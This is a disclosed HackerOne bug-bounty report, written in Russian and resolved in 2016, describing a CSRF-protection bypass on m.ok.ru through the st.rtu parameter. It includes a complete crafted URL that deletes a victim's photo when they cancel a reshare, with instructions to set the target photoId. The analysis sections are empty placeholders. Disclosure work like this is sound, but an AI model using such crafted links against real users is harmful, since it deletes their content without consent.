---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '102376'
original_report_id: '102376'
title: Обход защиты от csrf-ок в m.ok.ru
weakness: Cross-Site Request Forgery (CSRF)
team_handle: ok
created_at: '2015-11-28T00:14:51.242Z'
disclosed_at: '2016-03-18T16:35:17.243Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Обход защиты от csrf-ок в m.ok.ru

## Metadata

- HackerOne Report ID: 102376
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: ok
- Disclosed At: 2016-03-18T16:35:17.243Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Здравствуйте!

Нашел еще способ обхода защиты от csrf-ок через параметр ``st.rtu``
Тогда можно было обойти через ``dlgId`` и через ссылки на страницах

Сейчас заметил что можно сделать ajax запрос с токеном ``X-XTKN`` через параметр ``st.rtu``
Его можно отправить через редактирование заметки, записи в группе, при репосте и т.д Нам достаточно дать ссылку на репост и если пользователь нажмет на кнопку отменить то у него удалится фотка

Вот пример:

``http://m.ok.ru/dk?st.cmd=friendReshareTopic&st.topicId=64607766975788&st.rtu=%2Fdk%3Fbk%3DActionBus%26st.cmd%3DactionBus%26st.rtu%3D%252Fdk%253Fst.cmd%253DuserPhoto%2526st.phoId%253D812501293868%2526st.layer%253Dsoon%2526_prevCmd%253DuserPhoto%2526tkn%253D2696%26_prevCmd%3DuserPhoto%26tkn%3D6230%26st.actions%3D%7B%22photos.delete%22%253A%7B%22photoId%22%253A%22812501293868%22%252C%22groupId%22%253Anull%7D%7D%26_i_loc_rdr%3D1&st.friendId=584798454828&_prevCmd=friendMediaStatusComments&tkn=7824``

в ``photoId`` пишем ид фотки которую нужно удалить

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
